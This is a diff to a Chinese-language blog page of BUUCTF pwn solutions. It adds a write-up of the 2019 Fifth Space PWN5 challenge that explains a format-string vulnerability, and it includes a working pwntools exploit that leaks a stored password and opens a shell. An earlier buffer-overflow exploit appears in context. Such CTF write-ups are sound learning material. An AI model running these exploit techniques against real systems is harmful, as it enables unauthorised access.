@@ -89,7 +89,10 @@
 <meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="http://wlupus.github.io/2020/02/05/BUUCTFpwn/get_started_3dsctf_2016.png">
 <meta property="og:image" content="http://wlupus.github.io/2020/02/05/BUUCTFpwn/get_started_3dsctf_2016_2.png">
-<meta property="og:updated_time" content="2020-02-05T04:37:05.491Z">
+<meta property="og:image" content="http://wlupus.github.io/2020/02/05/BUUCTFpwn/pwn5_1.png">
+<meta property="og:image" content="http://wlupus.github.io/2020/02/05/BUUCTFpwn/pwn5_2.png">
+<meta property="og:image" content="http://wlupus.github.io/2020/02/05/BUUCTFpwn/pwn5_3.png">
+<meta property="og:updated_time" content="2020-02-07T10:20:55.074Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="BUUCTF pwn做题记录">
 <meta name="twitter:description" content="BUUCTF pwn做题记录">
@@ -353,8 +356,8 @@
               
                 <span class="post-meta-item-text">更新于&#58;</span>
               
-              <time title="更新于" itemprop="dateModified" datetime="2020-02-05T12:37:05+08:00">
-                2020-02-05
+              <time title="更新于" itemprop="dateModified" datetime="2020-02-07T18:20:55+08:00">
+                2020-02-07
               </time>
             
           </span>
@@ -421,6 +424,20 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">sh = process(<span class="string">'./get_started_3dsctf_2016'</span>)</span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">num = <span class="number">56</span></span><br><span class="line">address = <span class="number">0x080489a0</span></span><br><span class="line">exit_address = <span class="number">0x0804e6a0</span></span><br><span class="line">payload = <span class="string">'A'</span> * num + p32(address) + p32(exit_address) + p32(<span class="number">0x308cd64f</span>) + p32(<span class="number">0x195719d1</span>)</span><br><span class="line"><span class="comment"># sh.recvline()</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"><span class="comment">#sh.recvline()</span></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
 <p>这道题如果按这种方法做需要注意，因为最后程序是异常结束的(栈溢出)，并且没有遇到换行符，所以输出的flag仍处在缓冲区中，直接连接远程是无法看到结果的。我们可以再添加一个exit函数，使程序退出，从而将结果从缓冲区写入控制台中。</p>
 <h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>注意exit函数在这道题中的用途</p>
+<h1 id="第五空间2019-决赛-PWN5"><a href="#第五空间2019-决赛-PWN5" class="headerlink" title="[第五空间2019 决赛]PWN5"></a>[第五空间2019 决赛]PWN5</h1><h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><p>file查看是32位程序，开启了nx和canary保护</p>
+<p>之后ida查看，发现有buf处是明显的格式化字符串漏洞</p>
+<img src="/2020/02/05/BUUCTFpwn/pwn5_1.png">
+<p>为了执行system(‘/bin/sh’),我们可以获取0x804c044处的数值，然后将此值作为密码输入。</p>
+<p>首先构造payload(注意4字节对齐)</p>
+<p>尝试构造payload为%7$p + ‘A’  * 4 + p32(0x804c044), printf(&amp;buf)处输出的结果为0xf7dc18fb。</p>
+<img src="/2020/02/05/BUUCTFpwn/pwn5_2.png">
+<p>通过计算，我们可以得到第12个位置对应0x804c044</p>
+<img src="/2020/02/05/BUUCTFpwn/pwn5_3.png">
+<p>所以修改payload为%12$s + ‘A’ * 3 + p32(0x804c044) (A改为3个保证payload本身4字节对齐，用%s输出可以得到对应地址的值，相当于一次解引用)</p>
+<p>注意到一个细节，我们将接收的值u32解包后，得到的是将对应二进制视作unsigned int的结果，这样对负数结果会出现错误。通过对二进制补码的理解，我们可以得到A + (-A) = 2^32,所以需要额外特殊判断，将结果转化为有符号整型。</p>
+<p>最终的exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line">sh = process(<span class="string">'./pwn'</span>)</span><br><span class="line"><span class="comment"># sh = remote('node3.buuoj.cn', 25471)</span></span><br><span class="line"><span class="comment"># gdb.attach(sh)</span></span><br><span class="line">pd_address = <span class="number">0x0804c044</span></span><br><span class="line">payload = <span class="string">'%12$s'</span> + <span class="string">'A'</span> * <span class="number">3</span> + p32(pd_address)</span><br><span class="line">sh.recvuntil(<span class="string">'name:'</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">data = u32(sh.recvline()[<span class="number">6</span>:<span class="number">10</span>])</span><br><span class="line"><span class="comment"># log.success(str(data))</span></span><br><span class="line"><span class="keyword">if</span> data &gt; <span class="number">2</span>**<span class="number">31</span><span class="number">-1</span>:</span><br><span class="line">    data = data - <span class="number">2</span>**<span class="number">32</span></span><br><span class="line">sh.sendline(str(data))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><p>注意u32解包出来的是无符号整型，对负数结果需要另外处理</p>
 
       
     </div>
@@ -593,7 +610,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#get-started-3dsctf-2016"><span class="nav-number">1.</span> <span class="nav-text">get_started_3dsctf_2016</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#思路"><span class="nav-number">1.1.</span> <span class="nav-text">思路</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#总结"><span class="nav-number">1.2.</span> <span class="nav-text">总结</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#get-started-3dsctf-2016"><span class="nav-number">1.</span> <span class="nav-text">get_started_3dsctf_2016</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#思路"><span class="nav-number">1.1.</span> <span class="nav-text">思路</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#总结"><span class="nav-number">1.2.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#第五空间2019-决赛-PWN5"><span class="nav-number">2.</span> <span class="nav-text">[第五空间2019 决赛]PWN5</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#思路-1"><span class="nav-number">2.1.</span> <span class="nav-text">思路</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#总结-1"><span class="nav-number">2.2.</span> <span class="nav-text">总结</span></a></li></ol></li></ol></div>
             
 
           </div>
